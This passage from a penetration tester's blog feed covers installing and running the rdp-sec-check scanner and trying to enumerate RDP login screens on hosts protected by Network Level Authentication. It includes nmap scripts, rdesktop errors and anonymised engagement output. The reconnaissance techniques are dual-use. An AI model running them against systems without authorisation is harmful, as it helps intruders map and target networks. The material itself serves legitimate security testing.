&lt;p&gt;After searching Github and the Portcullis website, this is the most recent version available that I could find. The tool itself can be obtained in a few methods:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://labs.portcullis.co.uk/download/rdp-sec-check-0.9.tgz

git clone https://github.com/portcullislabs/rdp-sec-check.git
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Or by visiting &lt;em&gt;&lt;a href=&quot;https://labs.portcullis.co.uk/downloads/&quot;&gt;HERE&lt;/a&gt;&lt;/em&gt; and browsing through the Portcullis download page.&lt;/p&gt;

&lt;p&gt;I used the &lt;em&gt;‘wget’&lt;/em&gt; method and the file saved to my downloads location:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;:~$ wget https://labs.portcullis.co.uk/download/rdp-sec-check-0.9.tgz
--2017-01-26 10:22:29--  https://labs.portcullis.co.uk/download/rdp-sec-check-0.9.tgz
Resolving labs.portcullis.co.uk (labs.portcullis.co.uk)... 77.75.105.66
Connecting to labs.portcullis.co.uk (labs.portcullis.co.uk)|77.75.105.66|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13065 (13K) [application/x-gzip]
Saving to: ‘rdp-sec-check-0.9.tgz’

rdp-sec-check-0.9.tgz             100%[===========================================================&amp;gt;]  12.76K  --.-KB/s    in 0.005s  

2017-01-26 10:22:29 (2.63 MB/s) - ‘rdp-sec-check-0.9.tgz’ saved [13065/13065]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we need to extract the contents. If you’re following along with the install process and are not already in the same location where the file was downloaded to, change to that location now and then run:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;:~$ tar xvfz rdp-sec-check-0.9.tgz
rdp-sec-check-0.9/
rdp-sec-check-0.9/rdp-sec-check.pl
rdp-sec-check-0.9/COPYING.GPL
rdp-sec-check-0.9/COPYING.RDP-SEC-CHECK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thats us pretty much ready to go; however, my OCD kicks in as I like all my tools all in the same location. So I move the new ‘rdp-sec-check-0.9’ directory to my /opt directory (though this is personal preference and not required). I’m sure you all already know how to do this anyway!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ sudo mv rdp-sec-check-0.9 /opt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Within the /opt directory should now be the your newly moved ‘rdp-sec-check-0.9’ directory!&lt;/p&gt;

&lt;p&gt;From here its just a matter of running the tool:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ cd /opt/rdp-sec-check-0.9
$ ls
COPYING.GPL  COPYING.RDP-SEC-CHECK  rdp-sec-check.pl
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run the tool:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;$ ./rdp-sec-check.pl
Starting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ )
Copyright (C) 2014 Mark Lowe (mrl@portcullis-security.com)

./rdp-sec-check.pl [ options ]  ( --file hosts.txt | host | host:port )

options are:

  --file hosts.txt	targets, one ip:port per line
  --outfile out.log	output logfile
  --timeout sec		receive timeout (default 10s)
  --retries times	number of retries after timeout
  --verbose				
  --debug
  --help

Example:
         ./rdp-sec-check.pl 192.168.1.1
         ./rdp-sec-check.pl --file hosts.txt --timeout 15 --retries 3
         ./rdp-sec-check.pl --outfile rdp.log 192.168.69.69:3389
         ./rdp-sec-check.pl --file hosts.txt --outfile rdp.log –verbose
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here’s some sample output from the tool when used on an engagement against hosts which had active remote desktop services:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;Starting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Mon Jan 16 14:16:37 2017

[+] Scanning 31 hosts

Target:    10.1.1.131
IP:        10.1.1.131
Port:      3389

[+] Checking supported protocols

[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Supported
[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Supported
[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported

[+] Checking RDP Security Layer

[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE

[+] Summary of protocol support

[-] 10.1.1.131:3389 supports PROTOCOL_HYBRID: TRUE
[-] 10.1.1.131:3389 supports PROTOCOL_RDP   : TRUE
[-] 10.1.1.131:3389 supports PROTOCOL_SSL   : TRUE

[+] Summary of RDP encryption support

[-] 10.1.1.131:3389 has encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
[-] 10.1.1.131:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
[-] 10.1.1.131:3389 supports ENCRYPTION_METHOD_40BIT  : TRUE
[-] 10.1.1.131:3389 supports ENCRYPTION_METHOD_128BIT : TRUE
[-] 10.1.1.131:3389 supports ENCRYPTION_METHOD_56BIT  : TRUE
[-] 10.1.1.131:3389 supports ENCRYPTION_METHOD_FIPS   : TRUE

[+] Summary of security issues

[-] 10.1.1.131:3389 has issue SSL_SUPPORTED_BUT_NOT_MANDATED_MITM
[-] 10.1.1.131:3389 has issue WEAK_RDP_ENCRYPTION_SUPPORTED
[-] 10.1.1.131:3389 has issue FIPS_SUPPORTED_BUT_NOT_MANDATED
[-] 10.1.1.131:3389 has issue NLA_SUPPORTED_BUT_NOT_MANDATED_DOS
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;NB: The above IP address and any identifying information has been removed/altered to protect the integrity of the client tested.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Well thats about it folks, I hope you enjoyed the read and or found this article useful! I plan to make regular use of this tool, maybe you will too!&lt;/p&gt;

&lt;p&gt;Thanks for reading and if you have any comments you can get me here on &lt;a href=&quot;https://twitter.com/SecEventsPen&quot;&gt;Twitter&lt;/a&gt; or via &lt;em&gt;&lt;a href=&quot;mailto:seceventspen@alternativesec.xyz&quot;&gt;email&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If you want the more official line on the Portcullis ‘rdp-sec-check’ tool if can be found here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://labs.portcullis.co.uk/tools/rdp-sec-check/&quot;&gt;Portcullis rdp-sec-check&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you find it useful, don’t forget to show them some love for their awesome work!&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;
</description>
        <pubDate>Thu, 26 Jan 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/tools/2017/01/26/rdp-sec-check/</link>
        <guid isPermaLink="true">http://localhost:4000/tools/2017/01/26/rdp-sec-check/</guid>
        
        <category>How to</category>
        
        <category>Remote Desktop Services</category>
        
        <category>Portcullis</category>
        
        <category>RDP</category>
        
        <category>2017</category>
        
        
        <category>Tools</category>
        
      </item>
    
      <item>
        <title>How to detect Network Level Authentication (NLA)</title>
        <description>&lt;p&gt;While on a test recently, I noted that several hosts had TCP port 3389 (RDP) open. I had a little extra time to play with and after reading Robin Wood’s &lt;a href=&quot;https://twitter.com/digininja&quot;&gt;@diginija&lt;/a&gt; recent blog post &lt;a href=&quot;https://digi.ninja/blog/rdp_show_login_page.php&quot;&gt;Show RDP login page&lt;/a&gt;. Great I thought, time to put this to practice! Maybe I could snag some low hanging fruit such as what @diginija got a glimpse of i.e. logged in user accounts/usernames. Now the difference in my scenario was I was using a Linux host for testing and @digininja used a Windows host, this meant I’d be using either ‘rdesktop’ or ‘Remmina/FreeRDP’ instead of the native windows application. So a few questions arose from this, “Would I be able to replicate what @diginija achieved?” and “would there be any issues in trying to achieve the same objective, though using a different host??” Only one way to find out!&lt;/p&gt;

&lt;p&gt;First though, here’s a short round up/background info on both the RDP protocol and NLA service.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;RDP&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The Remote Desktop protocol, or RDP as its commonly known, is a proprietary service developed by Microsoft which provides a user with a graphical user interface (GUI) while connecting to another computer over a network connection. This requires a user to employ RDP client software, while the remote host must have an RDP server enabled. Put quite simply, the RDP services allows a user to initiate a remote session on the standard TCP port 3389 should a remote host have the service enabled (a switched on sys/network admin may change the standard port to hide of obfuscate the service from users in attempt to hide the service).&lt;/p&gt;

&lt;p&gt;More in-depth info on the service and its history can be found here via these external links:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Remote_Desktop_Protocol&quot;&gt;RDP Wikipedia&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/aa383015(v=vs.85).aspx&quot;&gt;RDP Microsoft Library&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://support.microsoft.com/en-us/kb/186607&quot;&gt;RDP Microsoft Support&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;NLA&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Network Level Authentication, or NLA as its commonly known, is a service/technology that is used in conjunction with Remote Desktop services and was rolled out with version 6.0 of RDP with initial support in MS Windows Vista. When RDP connections are made where NLA is not enabled or supported the attacker will automatically be connected to the remote host should the RDP server be enabled. When NLA is enabled with RDP, prior to establishing a RDP session a user will be prompted to enter valid network connection/login credentials, which will be authenticated prior to any RDP graphical session being established. Simply put, if the user trying to connect doesn’t valid login creds, then even though the RDP service is running, no RDP session will be created. This has the added advantage of preventing an unintended attacker from enumerating low hanging fruit such as user names, Domain names and potentially logged in users.&lt;/p&gt;

&lt;p&gt;More in-depth info on the Service and its history can be found here via these external links:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Network_Level_Authentication&quot;&gt;NLA Wikipedia&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://technet.microsoft.com/en-us/library/cc732713(v=ws.11).aspx&quot;&gt;NLA Microsoft Library&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ok, so now we have a nice overview/understanding of RDP and NLA it’s time to get to work on the issues at hand - How to detect NLA and what if its enabled?&lt;/p&gt;

&lt;p&gt;The network enumeration I had carried out on the standard ports and services highlighted that the RDP service was running on several hosts. This is always a personal favourite of mine to see if I can leverage this service for some ‘low hanging fruit’ or better still exploit a weak or misconfigured service. As I had a bit more time on this occassion, I decided to explore a different avenue and set about testing out a PoC I read about over on &lt;strong&gt;&lt;a href=&quot;https://digi.ninja/blog/rdp_show_login_page.php&quot;&gt;digi.ninja&lt;/a&gt;&lt;/strong&gt;. Though I was going to attempt to do a PoC using a linux host/tools.&lt;/p&gt;

&lt;p&gt;Using everyones favourite port scanning/enumertaion tool, NMAP, my scans against the target hosts identified that TCP port 3389 (standard RDP port) was open (see below):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;---[SNIP-Nmap-Scan]---
3389/tcp  open     ssl/ms-wbt-server? syn-ack ttl 121
| ssl-cert: Subject: commonName=****-****-****.****.net
| Not valid before: 2016-09-22T09:47:25
|_Not valid after:  2017-03-24T09:47:25
|_ssl-date: 2016-12-05T11:42:47+00:00; 0s from scanner time.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the Nmap NSE script ‘nmap -p 3389 –script rdp-enum-encryption’ I was able to confirm some further info (see below):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;---[SNIP-Nmap-RDP-NSE-Script]---
Nmap scan report for ****-****-****.****.net (10.xx.xx.xx)
Host is up (0.0013s latency).
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption:
|   Security layer
|_    CredSSP: SUCCESS

Nmap scan report for ****-****-****.****.net (10.xx.xx.xx)
Host is up (0.0014s latency).
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption:
|   Security layer
|_    CredSSP: SUCCESS
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NB: as seen above no encryption ciphers were displayed and CredSSP has been noted aswell. The NSE script output normally returns the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;---[SNIP-from-NSE-file-showing-example-output]
-- nmap -p 3389 --script rdp-enum-encryption &amp;lt;ip&amp;gt;
--
-- @output
-- PORT     STATE SERVICE
-- 3389/tcp open  ms-wbt-server
-- | rdp-enum-encryption:
-- |   Security layer
-- |     CredSSP: SUCCESS
-- |     Native RDP: SUCCESS
-- |     SSL: SUCCESS
-- |   RDP Encryption level: High
-- |     128-bit RC4: SUCCESS
-- |_    FIPS 140-1: SUCCESS
--
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This may indicate that we have encountered out first hurdle to overcome in achieving our goal of replicating @digininja’s work while using a linux client!?&lt;/p&gt;

&lt;p&gt;Ok, time to attempt an RDP connection to see what we can view:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;---[SNIP]---
# rdesktop 10.xx.xx.xx
Autoselected keyboard map en-gb
ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, so that attempt failed as CREDSSP is required by the target server. From carrying out some research into this, it seems rdesktop does support CREDSSP + kerberos which is a subset of NLA support. If NLA is enabled on the server, the client must provide a valid Kerberos ticket to initiate the connection, if you don’t have one, rdesktop will fail with the following error:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For continuity, I next tried the linux tool Remmina (a linux equivalent of of the windows RDP tool) with a view to following the steps outlined in digininja’s blog, through setting up and then tweaking the Remmina config to suit or circumstances.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/NLA/Remmina_setup.png&quot; alt=&quot;Remmina Setup&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/NLA/Remmina_config.png&quot; alt=&quot;Remmina Config&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Taking a shot in the dark and not being able to find any reference to amending the config file of a Remmina connection, I took a stab in the dark and entered the same string in to the Remmina config file that digininja used in the windows config change:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nohighlight&quot;&gt;enablecredsspsupport:i:0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I’m almost 100% certain that this isn’t the correct format for the Remmina configs but again, I couldn’t find any other info to guide me on this!! If anyone knows the correct string/format to enter into a Remmina config file drop me a &lt;em&gt;&lt;a href=&quot;mailto:seceventspen@alternativesec.xyz&quot;&gt;mail&lt;/a&gt;&lt;/em&gt; via the blog.&lt;/p&gt;

&lt;p&gt;As I suspected, the connection didn’t work via this particular method! Its looking more and more likely that NLA is enabled on the target hosts. I tried one last thing and replicated exactly what digininja did and set up a connection using a windows host, altered the config and then initiated the RDP session …. as you’ve all probably guessed by now, the connection failed!
Any further attempts at this stage of the engagement against the RDP service/server would prove useless!&lt;/p&gt;

&lt;p&gt;Whilst my attempts in proving a PoC using a linux host/tools in this instance was unsuccessful it was good to have time to go over some basics in identifying services and validating additional services in play which prevent an unintentional user from doing things and making connections to services they shouldn’t be!!&lt;/p&gt;

&lt;p&gt;In summary, my target hosts did employ NLA, as each time I attempted to initiate any type of remote connection protocol/service I would receive the following pop-up:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/NLA/NLAPopUp.png&quot; alt=&quot;NLA verification pop-up&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This, combined with the other information and output we have recovered, all point to the fact that NLA is in use on this occassion and will stop any type of connection and enumeration of the service without valid user credentials. This ultimately places another security barrier which has to be overcome in the way of any would be snooper!&lt;/p&gt;

&lt;p&gt;Should you ever come across a host with RDP server enabled and TCP port 3389 open, don’t pay it lip service and assume it will be locked down! Always investigate and attempt a connection, you don’t need to go to the extent that I have, but by checking it out, you never know how lucky you may get! If the host isn’t employing NLA you may well be able to enumerate information which could prove useful in gaining a foothold on a network at a later stage!&lt;/p&gt;

&lt;p&gt;I’d like to say thanks to a few folks who gave me some nudging long the way to write this up &lt;em&gt;tamonten&lt;/em&gt;, &lt;em&gt;digininja&lt;/em&gt; &amp;amp; &lt;em&gt;zyx2k&lt;/em&gt;. All very knowledgable peers and someday I might get to their levels!&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;
</description>
        <pubDate>Mon, 02 Jan 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/pentesting/2017/01/02/NLA-How-to/</link>
        <guid isPermaLink="true">http://localhost:4000/pentesting/2017/01/02/NLA-How-to/</guid>
        
        <category>How to - NLA - RDP - 2017</category>
        
        
        <category>Pentesting</category>
        
      </item>
    
      <item>
        <title>What to expect from AlternativeSec!</title>
        <description>&lt;p&gt;Well first things first, Happy New  Year!! Hopefully everyone’s head is a little clearer after all the festivities!&lt;/p&gt;

&lt;p&gt;Ok, so now that’s out of the way, more about what to expect from the AlternativeSec blog!&lt;/p&gt;

&lt;p&gt;Quite simply, you can expect to see some of my adventures from pentest land featured here (OpSec permitting), walkthroughs of vulnerable virtual machines from &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;Vulnhub&lt;/a&gt;, as well as other relevant topics and issues. There will also be blog posts about new things I encounter, testing tools, scripting, security cons and anything else that I am trying to learn for my own personal development and that never ending quest for knowledge!&lt;/p&gt;

&lt;p&gt;I’ll be aiming to keep the blog posts themselves pretty straight forward without being to long winded (where possible!). I’ll include links to accompanying research and/or third party sites where appropriate or any useful bits and pieces that have personally helped me out.&lt;/p&gt;

&lt;p&gt;Well I guess thats all for the first post from 2017 and be on the look out for future AlternativeSec blog posts.&lt;/p&gt;
</description>
        <pubDate>Mon, 02 Jan 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/alternativesec/2017/01/02/HNY-What-to-expect/</link>
        <guid isPermaLink="true">http://localhost:4000/alternativesec/2017/01/02/HNY-What-to-expect/</guid>
        
        <category>2017</category>
        
        <category>Happy New Year</category>
        
        <category>Alternativesec</category>
        
        <category>Expect</category>
        
        
        <category>AlternativeSec</category>
        
      </item>
    
      <item>
        <title>Coming Soon!</title>
        <description>&lt;p&gt;More about the Alternativesec blog and what to expect coming soon!!!&lt;/p&gt;
</description>
        <pubDate>Wed, 28 Dec 2016 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/alternativesec/2016/12/28/More-about-the-blog/</link>
        <guid isPermaLink="true">http://localhost:4000/alternativesec/2016/12/28/More-about-the-blog/</guid>
        
        <category>content</category>
        
        <category>expect</category>
        
        <category>Cyber</category>
        
        <category>Info</category>
        
        <category>Security</category>
        
        
        <category>AlternativeSec</category>
        
      </item>
    
      <item>
        <title>Hello World!</title>
        <description>&lt;p&gt;Hello World and welcome everyone to the very first blog post from AlternativeSec! This little venture is the result of some positive encouragement from several friends and peers, who’s technical level and expertise, is what I aspire to attain during my career.&lt;/p&gt;

&lt;p&gt;As a result of their continued encouragement and the following phrase “if you only do what you can do, you will never be more than you are now!” … from this the AlternativeSec blog came to life!&lt;/p&gt;

&lt;p&gt;So without further a-do they get prize of place in AlternativeSec’s first blog post, take a bow gentlemen, &lt;a href=&quot;https://digi.ninja&quot;&gt;digininja&lt;/a&gt;, &lt;a href=&quot;http://www.tamonten.com&quot;&gt;tamonten&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/zyx2k&quot;&gt;zyx2k&lt;/a&gt; without your little nudges along the way this would have always been an idea!&lt;/p&gt;
</description>
        <pubDate>Wed, 28 Dec 2016 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/alternativesec/2016/12/28/Hello-World/</link>
        <guid isPermaLink="true">http://localhost:4000/alternativesec/2016/12/28/Hello-World/</guid>
        
        <category>welcome</category>
        
        
        <category>AlternativeSec</category>
        
      </item>
    
  </channel>
</rss>
